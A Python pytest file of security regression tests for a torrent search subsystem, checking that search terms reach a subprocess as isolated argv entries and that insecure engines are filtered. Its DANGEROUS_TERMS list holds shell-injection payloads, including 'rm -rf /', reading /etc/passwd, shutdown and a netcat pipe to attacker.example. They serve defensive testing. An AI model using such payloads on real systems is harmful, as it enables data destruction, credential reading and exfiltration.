"""Security regression tests for the torrent search subsystem.

Covers:
  * subprocess invocation passes user terms as separate ``argv`` items so
    shell metacharacters in titles cannot be interpreted by a shell;
  * the strict profile rejects engines flagged as requiring insecure TLS;
  * oversized output rows are silently dropped without raising.
"""

from __future__ import annotations

import io
import os
import sys
import time
from typing import List, Optional

import pytest

_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from search_engines.config import SearchLimits, SearchProfile, STRICT_PROFILE
from search_engines.engine_policy import EnginePolicy, get_default_policy
from search_engines.facade import SearchFacade
from search_engines.parser import ResultParser
from search_engines.worker import _ProcessRunner


class _NullStdout(io.BytesIO):
    def readline(self, limit: int = -1) -> bytes:  # type: ignore[override]
        return b""


class _NullProcess:
    def __init__(self):
        self.stdout = _NullStdout(b"")
        self.stderr = io.BytesIO(b"")
        self.returncode: Optional[int] = 0

    def poll(self) -> Optional[int]:
        return 0

    def terminate(self) -> None:
        pass

    def kill(self) -> None:
        pass

    def wait(self, timeout: Optional[float] = None) -> int:
        return 0


class _RecordingRunner(_ProcessRunner):
    def __init__(self):
        self.invocations: List[List[str]] = []

    def spawn(self, args):  # type: ignore[override]
        self.invocations.append(list(args))
        return _NullProcess()  # type: ignore[return-value]


DANGEROUS_TERMS = [
    "$(rm -rf /)",
    "; cat /etc/passwd #",
    "`whoami`",
    "&& shutdown -h now",
    "| nc attacker.example 4444",
    "title\nwith\nnewlines",
    "title with quotes \" ' \\",
]


@pytest.mark.parametrize("term", DANGEROUS_TERMS)
def test_shell_metacharacters_arrive_as_single_argv_slot(monkeypatch, term):
    """The dangerous term must reach nova3 as a single argv entry, never a shell.

    The exact bytes may be normalized by the planner (e.g., newlines
    collapsed to spaces). What matters for the security boundary is that
    the worker always builds exactly three argv positional arguments
    (engines, category, query) - there is no way to escape that shape and
    therefore no way for a shell to interpret the payload.
    """

    runner = _RecordingRunner()
    monkeypatch.setattr(
        "search_engines.worker._ProcessRunner.spawn", runner.spawn
    )

    profile = SearchProfile(
        name="interactive",
        limits=SearchLimits(
            max_terms=4,
            max_concurrent_jobs=1,
            per_job_timeout_s=0.5,
            request_deadline_s=1.0,
            max_results_per_term=10,
            max_output_bytes=1024,
            max_line_bytes=512,
            queue_capacity=32,
        ),
        allow_insecure_engines=False,
        allow_no_timeout_engines=True,
    )
    facade = SearchFacade(profile=profile, policy=get_default_policy())

    list(facade.search([term + " series"]))  # drain generator

    assert runner.invocations, "worker should have been invoked"
    for args in runner.invocations:
        assert len(args) == 3, args
        engines_arg, category, query = args
        assert category == "anime"
        assert "\n" not in query and "\r" not in query
        # No engine list contains shell metacharacters either.
        for engine in engines_arg.split(","):
            assert all(ch.isalnum() or ch in "_-" for ch in engine), engine


def test_strict_profile_disables_insecure_engines():
    policy = get_default_policy()
    kept = policy.filter(policy.known_engines(), STRICT_PROFILE)
    for engine in kept:
        record = policy.record_for(engine)
        assert record.requires_insecure_tls is False, engine
        assert record.missing_timeout is False, engine


def test_parser_drops_oversize_rows_safely():
    parser = ResultParser(max_line_bytes=64)
    huge = b"|".join([b"x" * 200] * 7) + b"\n"
    assert parser.parse(huge) is None  # silently dropped, no exception


def test_search_engines_does_not_use_shell_module():
    """Sanity check: the package should not expose any shell=True invocation.

    Performed via static inspection rather than monkey-patching so the
    test cannot be bypassed by run-time tricks.
    """
    from search_engines import facade, worker

    for module in (facade, worker):
        source = open(module.__file__, "r", encoding="utf-8").read()
        assert "shell=True" not in source, f"shell=True found in {module.__file__}"
